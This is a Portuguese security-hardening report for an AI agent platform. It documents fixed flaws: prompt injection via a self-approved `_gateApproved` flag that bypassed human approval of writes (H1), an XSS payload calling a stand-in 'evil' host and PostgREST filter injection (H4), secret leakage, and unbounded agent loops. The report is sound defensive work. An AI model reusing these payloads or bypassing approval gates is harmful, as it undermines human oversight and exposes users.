# Hardening de segurança e runtime — Plutão OS (2026-10-07)

**Escopo:** auditoria completa do monorepo `plutao-os` (código, banco e documentação) com correção
definitiva dos problemas encontrados — sem fases, sem débito técnico deixado para depois.

**Resultado:** 10 famílias de falhas corrigidas na raiz, 1 migration aplicada em produção,
329 testes verdes, `tsc --noEmit` limpo nos três workspaces, documentação sincronizada com o código.

| Métrica | Antes | Depois |
| --- | --- | --- |
| Testes | 315 (7 falhando) | **329 (0 falhando)** |
| Typecheck | limpo | **limpo** |
| Controles de escrita validados no servidor | não | **sim (hash + uso único)** |
| Registro tipado de capacidades | não existia | **`lib/capabilities/registry.ts` + doc gerado** |
| Rate limit no MCP | 1 de 5 tools | **todas as tools** |
| Orçamento acumulado do agent loop | inexistente | **60 iterações + 240 s por execution** |
| Identidade do agente | configurada e descartada | **aplicada no chat e no MCP** |

---

## Índice

- [H1 — Bypass do write gate por booleano `_gateApproved`](#h1)
- [H2 — Gate reutilizável e payload não vinculado](#h2)
- [H3 — Vazamento de segredos em trace, log, erro e título](#h3)
- [H4 — XSS no export HTML, filtros livres no Supabase, `select` sem validação](#h4)
- [H5 — Rate limit cobria apenas uma tool do MCP](#h5)
- [H6 — Loop de agente sem detecção de repetição nem orçamento](#h6)
- [H7 — Fallback "allow" quando a capability não existia](#h7)
- [H8 — Namespace de sandbox compartilhado entre usuários](#h8)
- [H9 — Ausência de registro tipado de capacidades](#h9)
- [H10 — Identidade do agente configurada era descartada](#h10)
- [Banco de dados](#banco-de-dados)
- [Testes e verificação](#testes-e-verificação)
- [Arquivos tocados](#arquivos-tocados)

---

<a id="h1"></a>
## H1 — Bypass do write gate por booleano `_gateApproved`

**Encontrado.** Os executores de escrita (`github`, `vercel`, `render`, `cloudflare`, `supabase`,
`telegram`) decidiam se a operação estava autorizada lendo um campo do **próprio input**:

```ts
const gateApproved = Boolean(input._gateApproved);
```

O input vem do modelo. Qualquer payload com `_gateApproved: true` — inclusive um gerado por
prompt injection a partir de conteúdo externo (um README, uma issue, uma resposta de API) —
executava a escrita real **sem nenhum gate aprovado por humano**. O Princípio 1 do produto
("efeito colateral exige aprovação humana") era, na prática, opcional.

**Corrigido em.**
- `apps/web/src/lib/connectors/writeGateGuard.ts` (novo) — guard único usado por todos os
  executores de escrita.
- `apps/web/src/lib/runtime/tools/{github,vercel,render,cloudflare,supabase,telegram}.ts`.

**Como.** `_gateApproved` deixou de existir. A autorização agora é `_gateId`, e o guard valida no
servidor, contra o banco: o gate existe, pertence ao **mesmo usuário**, está com status
`approved`, e o hash do payload que vai executar bate com o hash do payload que o humano aprovou.
O claim é atômico e de uso único. Sem `_gateId` válido, o executor **não escreve** — cria ou
retorna `GATE_PENDING`.

**Por quê.** A decisão de autorização não pode viver no mesmo canal que a proposta de ação.
Separando proposta (input do modelo) de autorização (estado no banco, criado pela ação humana
na UI), o bypass deixa de ser possível por construção.

---

<a id="h2"></a>
## H2 — Gate reutilizável e payload não vinculado

**Encontrado.** `markGateApproved` apenas trocava `status` para `approved`. Nada impedia:
reaproveitar o mesmo gate para uma segunda escrita; executar um payload **diferente** do que o
humano aprovou na tela; ou aprovar e executar duas vezes em corrida (duplo clique, retry do
navegador, retomada de missão).

**Corrigido em.**
- `apps/web/src/lib/connectors/gatePayload.ts` (novo) — canonicalização + `sha256` do payload.
- `apps/web/src/lib/connectors/gates.ts` — `approveGate`, `consumeGateForWrite`,
  `finalizeGateExecution`, `failUnconsumedGate`.
- `apps/web/src/app/api/gates/[id]/route.ts` — fluxo `pending → approved → executing → executed`.
- `packages/db/src/schema-gates.ts` + `packages/db/drizzle/0020_hardening_write_gates.sql`.

**Como.** Na aprovação, o servidor calcula o hash do payload persistido (o mesmo que o humano viu)
e grava em `payload_hash`. No momento da escrita, `consumeGateForWrite` faz um `UPDATE` condicional
que só vence se o gate ainda estiver `approved` e o hash bater — quem perder a corrida recebe
recusa. O estado vira `executing` antes do efeito colateral, então o gate é de uso único.

**Por quê.** "Aprovado" e "executado" são estados diferentes; sem o estado intermediário e sem
vínculo criptográfico ao payload, a aprovação humana vira uma autorização em branco.

---

<a id="h3"></a>
## H3 — Vazamento de segredos em trace, log, erro e título

**Encontrado.** Vários canais devolviam texto cru ao usuário e ao banco:
- `emit("error", { error: err.message })` no chat mandava mensagem de erro de provedor direto ao cliente;
- `fullInput`/`fullOutput` do trace iam para o SSE com o payload completo de `render.env_set` (o valor do segredo aparecia em claro, embora o *preview* do gate já fosse mascarado);
- evidência de missão gravava `tool:render capability:env_set → ${trace.output}` cru;
- `mcp/audit.ts` gravava `errorMessage` cru em `audit_events`;
- títulos de conversa (`conversations.title`, criados pelo chat, pelo PATCH e pelo MCP) aceitavam qualquer texto — e são expostos por `plutao_list_conversations`.

**Corrigido em.**
- `apps/web/src/lib/security/sanitize.ts` (novo) — sanitizador central: `sanitizeText`,
  `sanitizeValue` (recursivo, com chaves sensíveis extras), `sanitizeError`,
  `sanitizeErrorForClient` (com `ref` de correlação), `sanitizeTitle`, `maskSecret`.
- Aplicado em: `app/api/chat/route.ts`, `lib/chat/renderToolRunner.ts`, `lib/mcp/audit.ts`,
  `lib/mcp/tools.ts`, `app/api/conversations/route.ts`, `app/api/conversations/[id]/route.ts`,
  `app/api/gates/[id]/route.ts`.

**Por quê.** Um único sanitizador central elimina a classe inteira do problema: não existe caminho
novo que "esqueça" de mascarar, porque o mascaramento acontece no ponto de saída, não no ponto de
uso. Erros para o cliente passam a devolver mensagem genérica + referência de log, para
diagnóstico sem exposição.

---

<a id="h4"></a>
## H4 — XSS no export HTML, filtros livres no Supabase, `select` sem validação

**Encontrado.**
1. `files.export_html` inseria `input.content` **cru** dentro do documento:
   `<main>\n${bodyContent}\n</main>`. `<script>fetch('//evil')</script>` virava HTML válido e
   executava quando o usuário abrisse o arquivo exportado.
2. `supabase.table_read` recebia `where` como string livre e a repassava para a query string do
   PostgREST: `where: "limit=eq.1"` redefinia um parâmetro reservado; `or`/`and` permitiam
   compor lógica arbitrária; o filtro declarado podia ser anulado.
3. `select` só era validado por uma heurística de substring (`includes("insert")` etc.),
   contornável, e o nome da tabela não era validado.
4. O frontmatter YAML do Markdown não escapava `origin` (quebra de frontmatter por `\n`).

**Corrigido em.**
- `apps/web/src/lib/security/htmlSanitize.ts` (novo) — allowlist de tags/atributos, remoção de
  `<script>`/`<style>`/`<iframe>`/`<svg>`/`<form>`… com conteúdo, bloqueio de `on*`, `style` e
  URLs com esquema não permitido (`javascript:` etc.).
- `apps/web/src/lib/connectors/supabaseFilters.ts` (novo) — `validateTableName`, `validateSelect`,
  `parseTableFilters` (allowlist de operadores, parâmetros reservados proibidos, limites de
  quantidade e tamanho).
- `apps/web/src/lib/runtime/tools/export.ts` e `lib/connectors/supabaseWrite.ts`.

**Por quê.** Conteúdo gerado pelo modelo (ou influenciado por conteúdo externo) é entrada não
confiável. O export é aberto no navegador do usuário: allowlist é a única postura defensável.
No Supabase, o filtro precisa ser estrutura validada, não string concatenada — assim o chamador
não consegue reescrever a consulta que declarou.

---

<a id="h5"></a>
## H5 — Rate limit cobria apenas uma tool do MCP

**Encontrado.** `checkMcpRateLimit` era chamado **somente** dentro de `toolSendMessage`. As tools
de leitura (`plutao_system_status`, `plutao_list_connectors`, `plutao_list_conversations`,
`plutao_get_mission`) podiam ser chamadas sem qualquer limite — abuso de leitura e custo de banco
sem teto.

**Corrigido em.** `lib/mcp/tools.ts` (`withMcpGuards`), `app/api/mcp/route.ts` (todas as tools
passaram a usar o guard), `lib/mcp/audit.ts` (bloqueio é auditado com status `rate_limited`).

**Por quê.** Limite de taxa é controle de capacidade, não detalhe de uma tool. Aplicado no
wrapper comum, vale para todas as tools presentes e futuras.

---

<a id="h6"></a>
## H6 — Loop de agente sem detecção de repetição nem orçamento

**Encontrado.** O `runAgentLoop` só parava por: erro de tool, `idempotent`, ausência de proposta
de tool, ou `MAX_ITERATIONS` (20, por chamada). Faltava:
- **detecção de repetição** — o modelo podia propor a mesma tool com o mesmo input, ou receber o
  mesmo output, e o loop continuava gastando tokens;
- **teto acumulado** — `MAX_ITERATIONS` era reiniciado a cada request. Como a missão é retomada
  (`findRecoverableExecution`) em cada aprovação de gate e em cada nova chamada, o total de
  iterações era ilimitado entre requests: exatamente o "loop de agente / queima de tokens";
- **teto de tempo** — o loop inteiro roda dentro de um request com `maxDuration = 300`. Estourar
  o teto da plataforma deixava a execution em `RUNNING`, e a próxima chamada a retomava.

**Corrigido em.** `apps/web/src/lib/runtime/agent-loop.ts`, `apps/web/src/lib/runtime/types.ts`
(`CheckpointPayload.iterationsUsed`).

**Como.**
- `MAX_TOTAL_ITERATIONS = 60` por **execution**, persistido no checkpoint e somado entre retomadas;
- `MAX_LOOP_DURATION_MS = 240_000` verificado a cada iteração (margem sobre os 300 s da plataforma);
- assinatura `tool::input` repetida → parada suave `REPEATED_TOOL_CALL`;
- output idêntico duas vezes seguidas → parada suave `NO_PROGRESS`;
- parada suave devolve o controle ao DoD (a missão vai para verificação em vez de falhar);
  estouro de orçamento é parada dura (a execução é marcada `FAILED`, sem ficar pendurada).

**Por quê.** Um agente autônomo precisa de orçamento global e de um critério de "não estou
progredindo". Sem isso, custo é ilimitado e o sistema não tem como se recuperar sozinho.

---

<a id="h7"></a>
## H7 — Fallback "allow" quando a capability não existia

**Encontrado.** Os executores usavam `manifest.capabilities.find(...)`; quando a capability não
era encontrada, a execução seguia com um caminho genérico em vez de recusar. Um manifesto
incompleto (ou um nome de ação errado) virava permissão implícita.

**Corrigido em.** `lib/runtime/tools/{github,vercel,render,cloudflare}.ts`.

**Por quê.** Fail-closed: ausência de declaração é ausência de permissão.

---

<a id="h8"></a>
## H8 — Namespace de sandbox compartilhado entre usuários

**Encontrado.** Três problemas no sandbox de arquivos:
1. `runFilesystem` usava `executionId || "default"`. Sem execução associada, **todos os usuários**
   caíam no mesmo namespace `default` — arquivos de um usuário visíveis para outro
   (`sandbox/exec/default` no modo local, chave `default` no storage em memória).
2. `resolveUserSandboxPath` fazia `process.env.FILESYSTEM_SANDBOX_ROOT = userSandboxRoot` e
   restaurava no `finally`. Em serverless isso é corrida entre requisições concorrentes: um
   usuário podia resolver caminho dentro da sandbox de outro.
3. `realpath(SANDBOX_ROOT)` era chamado **fora** do `try`: se a raiz não existisse, a resolução
   lançava e o tool devolvia `PERMISSION_DENIED` (falha funcional, não de segurança).

**Corrigido em.**
- `lib/runtime/tools/namespace.ts` (novo) — `sandboxNamespace(userId, executionId)` =
  `userId__executionId`, cada segmento reduzido a `[A-Za-z0-9_-]`.
- `lib/runtime/tools/sandbox.ts` — reescrito sem estado global; `ensureSandboxRoot()` cria a raiz
  sob demanda; a validação resolve o **ancestral existente mais próximo** via `realpath`, o que
  bloqueia escape por symlink mesmo para arquivo que ainda não existe.
- `lib/runtime/tools/{filesystem,storage,export,dispatcher}.ts` — namespace propagado
  (`userId` chega até o storage); `getExecutionPath` valida contenção (defense in depth).

**Por quê.** Isolamento entre tenants é requisito de segurança, não detalhe de implementação —
e mutação de variável de ambiente global em runtime concorrente é uma corrida por definição.

---

<a id="h9"></a>
## H9 — Ausência de registro tipado de capacidades

**Encontrado.** "Quais capacidades existem, quais estão habilitadas e quais controles cada uma
exige" estava espalhado entre manifestos, executores e documentação — e a documentação já havia
divergido do código. Não havia uma fonte de verdade que pudesse **recusar** execução.

**Corrigido em.**
- `apps/web/src/lib/capabilities/registry.ts` (novo) — registro tipado: `CapabilityControl`,
  `IMPLEMENTED_CONTROLS`, `DECLARATIONS` por provedor, `evaluateCapability` (fail-closed),
  `capabilityBlockReason`, `assertRegistryCoverage`, `INTERNAL_TOOL_CONTROLS`,
  `evaluateInternalTool`.
- `lib/runtime/tools/dispatcher.ts` — tools internas passam por `evaluateInternalTool`.
- `lib/connectors/runRestCapability.ts` — toda capability REST é validada antes do HTTP.
- `apps/web/src/lib/capabilities/registryDoc.ts` + `__tests__/capabilitiesDoc.test.ts` (novos) —
  geram e **verificam em CI** `docs/CAPABILITIES.md`.
- `docs/CAPABILITIES.md` (gerado), script `npm run docs:capabilities`.

**Por quê.** Um registro que não pode bloquear nada é documentação. Aqui ele é consultado antes de
executar, é verificado contra os manifestos (`assertRegistryCoverage`) e é verificado contra a
documentação (teste de drift) — as três coisas que fazem a informação permanecer verdadeira.

---

<a id="h10"></a>
## H10 — Identidade do agente configurada era descartada

**Encontrado.** O usuário configura nome, identidade e personalidade do agente em
Configurações > Agente (`PATCH /api/agent` → tabela `agents`). O `api/chat/route.ts` lia esses
campos em cada requisição e **jogava fora**: `agentName` só aparecia numa mensagem de fallback
quando não havia chave de API, `agentIdentity` nunca era usado e `personality` era lido e
ignorado por completo. O system prompt começava sempre com o literal `NIX_IDENTITY`, então
personalizar o agente não mudava nada no comportamento.

Além disso, o caminho MCP (`plutao_send_message`) usava uma **persona diferente**, hardcoded:
`"Você é o Plutão, agente de execução"` — e sem os princípios operacionais (regra de ouro do
operador minucioso). O mesmo agente respondia como duas entidades distintas dependendo da
superfície.

**Corrigido em.**
- `apps/web/src/lib/agente/identity.ts` (novo) — `loadAgentIdentity(userId)`,
  `buildIdentityLine`, `buildIdentityBlock`, com fallback silencioso para o perfil default.
- `apps/web/src/app/api/chat/route.ts` — passa a usar o perfil no system prompt (identidade +
  bloco de personalidade quando configurada).
- `apps/web/src/lib/mcp/tools.ts` — mesmo perfil, mesma identidade e mesmos princípios
  operacionais do chat.

**Como.** Com o perfil default, `buildIdentityLine` devolve **exatamente** `NIX_IDENTITY`, então
não há regressão de prompt para quem nunca personalizou. Com perfil customizado, o prompt passa a
dizer `Você é <nome>, <identidade>.` e, se houver, um bloco `PERSONALIDADE (definida pelo usuário)`.

**Por quê.** Uma configuração de identidade que não afeta o comportamento é um bug de produto, não
uma preferência cosmética: o usuário define como o agente deve se comportar e o sistema ignora.
E duas personas diferentes no mesmo produto quebram a percepção de um agente único e coerente.

---

## Banco de dados

**Migration `0020_hardening_write_gates.sql` aplicada em produção** (projeto Neon `Plutao`,
`fragrant-boat-15398274`, São Paulo) — o operador autorizou explicitamente a aplicação de SQL,
sobrepondo a regra anterior de "não aplicar SQL no Neon".

```sql
ALTER TABLE "write_gates" ADD COLUMN IF NOT EXISTS "payload_hash" text;
ALTER TABLE "write_gates" ADD COLUMN IF NOT EXISTS "consumed_at" timestamp with time zone;
ALTER TABLE "write_gates" ADD COLUMN IF NOT EXISTS "consumed_by" text;
CREATE INDEX IF NOT EXISTS "write_gates_status_consumed_idx"
  ON "write_gates" ("status", "consumed_at");
```

Verificado em produção: as três colunas existem em `write_gates`.

A migration é **puramente aditiva e idempotente** (`IF NOT EXISTS`): não altera nem remove dados.
Gates criados antes dela ficam com `payload_hash` nulo e **não** são invalidados — no momento da
aprovação o servidor calcula o hash a partir do `payload` já persistido (o mesmo que o humano viu)
e o grava. Nenhum gate pendente real é perdido.

---

## Testes e verificação

```
npm run typecheck   →  limpo (packages/domain, packages/db, apps/web)
npm test            →  61 arquivos, 329 testes, 0 falhas
```

Testes adicionados/reescritos para cobrir o novo contrato:

| Arquivo | Cobertura |
| --- | --- |
| `lib/connectors/__tests__/cloudflare.test.ts` | `_gateApproved` ignorado (fail-closed) + execução só com gate consumido |
| `lib/connectors/__tests__/render.test.ts` | idem para `env_set` (segredo) e `deploy_trigger` |
| `lib/connectors/__tests__/supabase.test.ts` | `select` inválido, parâmetro reservado recusado, operador não permitido |
| `lib/capabilities/__tests__/capabilitiesDoc.test.ts` | cobertura do registro + drift da documentação |
| `lib/agente/__tests__/identity.test.ts` | identidade default = `NIX_IDENTITY`, perfil custom, personalidade, fallback de banco |
| `lib/mcp/__tests__/sendMessageEventsOrder.test.ts` | MCP usa a mesma identidade e os princípios do chat |
| `lib/runtime/tools/__tests__/filesystem.test.ts` | namespace `userId__executionId` |
| `lib/chat/__tests__/chatHardening.test.ts` | erro de criação de gate no guard compartilhado |
| `lib/cockpit/__tests__/missionRuntimeFixes.test.ts` | fluxo `approveGate` + retomada de missão |

---

## Arquivos tocados

**Novos**

```
apps/web/src/lib/agente/identity.ts
apps/web/src/lib/agente/__tests__/identity.test.ts
apps/web/src/lib/capabilities/registry.ts
apps/web/src/lib/capabilities/registryDoc.ts
apps/web/src/lib/capabilities/__tests__/capabilitiesDoc.test.ts
apps/web/src/lib/connectors/gatePayload.ts
apps/web/src/lib/connectors/writeGateGuard.ts
apps/web/src/lib/connectors/supabaseFilters.ts
apps/web/src/lib/security/sanitize.ts
apps/web/src/lib/security/htmlSanitize.ts
apps/web/src/lib/runtime/tools/namespace.ts
packages/db/drizzle/0020_hardening_write_gates.sql
docs/CAPABILITIES.md
docs/HARDENING_2026-10.md
```

**Alterados**

```
apps/web/src/lib/connectors/gates.ts
apps/web/src/lib/connectors/runRestCapability.ts
apps/web/src/lib/connectors/supabaseWrite.ts
apps/web/src/lib/runtime/tools/github.ts
apps/web/src/lib/runtime/tools/vercel.ts
apps/web/src/lib/runtime/tools/render.ts
apps/web/src/lib/runtime/tools/cloudflare.ts
apps/web/src/lib/runtime/tools/supabase.ts
apps/web/src/lib/runtime/tools/telegram.ts
apps/web/src/lib/runtime/tools/export.ts
apps/web/src/lib/runtime/tools/filesystem.ts
apps/web/src/lib/runtime/tools/storage.ts
apps/web/src/lib/runtime/tools/sandbox.ts
apps/web/src/lib/runtime/tools/dispatcher.ts
apps/web/src/lib/runtime/agent-loop.ts
apps/web/src/lib/runtime/types.ts
apps/web/src/lib/chat/renderToolRunner.ts
apps/web/src/lib/mcp/tools.ts
apps/web/src/lib/mcp/audit.ts
apps/web/src/lib/mcp/__tests__/sendMessageEventsOrder.test.ts
apps/web/src/app/api/chat/route.ts
apps/web/src/app/api/gates/[id]/route.ts
apps/web/src/app/api/mcp/route.ts
apps/web/src/app/api/conversations/route.ts
apps/web/src/app/api/conversations/[id]/route.ts
packages/db/src/schema-gates.ts
package.json
docs/CURRENT_STATE.md
docs/VERIFICATION.md
docs/NEON_SETUP.md
docs/MCP_SERVER.md
```
